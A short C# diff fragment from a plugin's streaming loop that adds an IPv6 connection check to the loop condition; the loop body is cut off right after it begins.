@@ -80,7 +80,7 @@ namespace Plugin
             IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
             MemoryStream stream;
             Thread.Sleep(1);
-            while (IsOk && Connection.IsConnected)
+            while (IsOk && (Connection.IsConnected || Connection.IsConnectedV6))
             {
                 try
                 {
